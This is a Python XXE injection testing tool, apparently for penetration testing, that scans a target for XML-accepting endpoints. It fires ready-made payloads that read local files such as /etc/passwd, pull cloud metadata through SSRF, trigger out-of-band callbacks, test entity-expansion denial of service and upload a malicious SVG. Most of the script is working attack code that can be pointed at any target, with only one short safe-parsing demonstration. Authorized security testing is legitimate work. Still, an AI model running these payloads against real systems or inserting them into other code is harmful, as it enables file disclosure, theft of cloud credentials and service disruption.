#!/usr/bin/env python3
"""Agent for testing XXE injection vulnerabilities during authorized assessments."""

import requests
import json
import sys
import argparse
import urllib3
from datetime import datetime
from urllib.parse import urljoin
import defusedxml.ElementTree as safe_ET

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

XXE_PAYLOADS = {
    "file_read_linux": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><search>&xxe;</search></root>''',

    "file_read_windows": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><search>&xxe;</search></root>''',

    "ssrf_metadata": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><search>&xxe;</search></root>''',

    "oob_http": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{callback}/xxe-test">
]>
<root><search>&xxe;</search></root>''',

    "oob_parameter_entity": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{callback}/xxe-param">
  %xxe;
]>
<root><search>test</search></root>''',

    "php_filter": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><search>&xxe;</search></root>''',

    "billion_laughs_check": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
]>
<root><search>&lol3;</search></root>''',
}


def detect_xml_endpoints(base_url, token=None):
    """Test if endpoints accept XML content type."""
    print("[*] Detecting XML-accepting endpoints...")
    headers = {"Content-Type": "application/xml"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    xml_test = '<?xml version="1.0"?><root><test>hello</test></root>'
    endpoints = ["/api/search", "/api/users", "/api/data", "/api/import",
                 "/api/upload", "/ws/service", "/soap", "/xml"]
    xml_endpoints = []
    for ep in endpoints:
        url = urljoin(base_url, ep)
        try:
            resp = requests.post(url, headers=headers, data=xml_test, timeout=10, verify=False)
            if resp.status_code not in (404, 405, 415):
                xml_endpoints.append({"endpoint": ep, "status": resp.status_code})
                print(f"  [+] {ep}: Accepts XML (status {resp.status_code})")
        except requests.RequestException:
            continue
    return xml_endpoints


def test_content_type_switch(base_url, endpoint, token=None):
    """Test if a JSON endpoint also accepts XML."""
    print(f"\n[*] Testing content-type switch on {endpoint}...")
    json_headers = {"Content-Type": "application/json"}
    xml_headers = {"Content-Type": "application/xml"}
    if token:
        json_headers["Authorization"] = f"Bearer {token}"
        xml_headers["Authorization"] = f"Bearer {token}"
    url = urljoin(base_url, endpoint)
    try:
        json_resp = requests.post(url, headers=json_headers,
                                   json={"search": "test"}, timeout=10, verify=False)
        xml_resp = requests.post(url, headers=xml_headers,
                                  data='<?xml version="1.0"?><root><search>test</search></root>',
                                  timeout=10, verify=False)
        if xml_resp.status_code not in (415, 400, 404):
            print(f"  [!] Endpoint accepts both JSON ({json_resp.status_code}) and XML ({xml_resp.status_code})")
            return True
    except requests.RequestException:
        pass
    return False


def test_xxe_payloads(base_url, endpoint, token=None, callback=None):
    """Test an endpoint with XXE payloads."""
    print(f"\n[*] Testing XXE payloads on {endpoint}...")
    findings = []
    headers = {"Content-Type": "application/xml"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    url = urljoin(base_url, endpoint)

    file_indicators = {
        "file_read_linux": ["root:", "/bin/bash", "/bin/sh", "nobody:"],
        "file_read_windows": ["[fonts]", "[extensions]", "for 16-bit"],
        "ssrf_metadata": ["ami-id", "instance-id", "security-credentials"],
        "php_filter": ["cm9vd", "L2Jpbi9"],  # base64 fragments
    }

    for name, payload in XXE_PAYLOADS.items():
        if "{callback}" in payload:
            if callback:
                payload = payload.replace("{callback}", callback)
            else:
                continue
        try:
            resp = requests.post(url, headers=headers, data=payload, timeout=15, verify=False)
            indicators = file_indicators.get(name, [])
            matched = [ind for ind in indicators if ind in resp.text]
            if matched:
                findings.append({
                    "type": "XXE_CONFIRMED", "payload_name": name,
                    "endpoint": endpoint, "indicators": matched,
                    "severity": "CRITICAL",
                })
                print(f"  [!] XXE CONFIRMED ({name}): {matched}")
            elif resp.status_code == 200 and "error" not in resp.text.lower()[:200]:
                if name.startswith("oob"):
                    findings.append({
                        "type": "XXE_OOB_SENT", "payload_name": name,
                        "endpoint": endpoint, "severity": "HIGH",
                        "detail": "OOB payload sent - check callback server",
                    })
                    print(f"  [?] OOB payload sent ({name}) - check callback server")
        except requests.RequestException as e:
            if "timed out" in str(e) and name == "billion_laughs_check":
                findings.append({
                    "type": "XXE_DOS_POSSIBLE", "payload_name": name,
                    "endpoint": endpoint, "severity": "HIGH",
                })
                print(f"  [!] Possible DoS via entity expansion (request timed out)")
    return findings


def test_svg_upload(base_url, upload_endpoint, token):
    """Test SVG file upload for XXE."""
    print(f"\n[*] Testing SVG upload XXE on {upload_endpoint}...")
    svg_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>'''
    headers = {"Authorization": f"Bearer {token}"}
    url = urljoin(base_url, upload_endpoint)
    try:
        files = {"file": ("xxe.svg", svg_xxe, "image/svg+xml")}
        resp = requests.post(url, headers=headers, files=files, timeout=15, verify=False)
        if resp.status_code in (200, 201):
            print(f"  [+] SVG uploaded (status {resp.status_code})")
            return [{"type": "SVG_XXE_UPLOAD", "endpoint": upload_endpoint,
                      "status": resp.status_code, "severity": "HIGH"}]
    except requests.RequestException as e:
        print(f"  [-] Error: {e}")
    return []


def verify_safe_parsing(xml_string):
    """Demonstrate safe XML parsing with defusedxml."""
    try:
        safe_ET.fromstring(xml_string)
        return True
    except Exception as e:
        print(f"  [+] defusedxml correctly blocked: {type(e).__name__}")
        return False


def generate_report(findings, output_path):
    """Generate XXE assessment report."""
    report = {
        "assessment_date": datetime.now().isoformat(),
        "total_findings": len(findings),
        "by_type": {},
        "findings": findings,
    }
    for f in findings:
        t = f.get("type", "UNKNOWN")
        report["by_type"][t] = report["by_type"].get(t, 0) + 1
    with open(output_path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")


def main():
    parser = argparse.ArgumentParser(description="XXE Injection Testing Agent")
    parser.add_argument("base_url", help="Base URL of the target")
    parser.add_argument("--token", help="Bearer token for authentication")
    parser.add_argument("--endpoint", default="/api/search", help="XML endpoint to test")
    parser.add_argument("--callback", help="OOB callback server (e.g., abc123.oast.fun)")
    parser.add_argument("--upload-endpoint", help="SVG upload endpoint")
    parser.add_argument("-o", "--output", default="xxe_report.json")
    args = parser.parse_args()

    print(f"[*] XXE Injection Assessment: {args.base_url}")
    findings = []
    xml_eps = detect_xml_endpoints(args.base_url, args.token)
    test_content_type_switch(args.base_url, args.endpoint, args.token)
    findings.extend(test_xxe_payloads(args.base_url, args.endpoint, args.token, args.callback))
    for ep in xml_eps:
        if ep["endpoint"] != args.endpoint:
            findings.extend(test_xxe_payloads(args.base_url, ep["endpoint"], args.token, args.callback))
    if args.upload_endpoint:
        findings.extend(test_svg_upload(args.base_url, args.upload_endpoint, args.token))
    verify_safe_parsing(XXE_PAYLOADS["file_read_linux"])
    generate_report(findings, args.output)


if __name__ == "__main__":
    main()
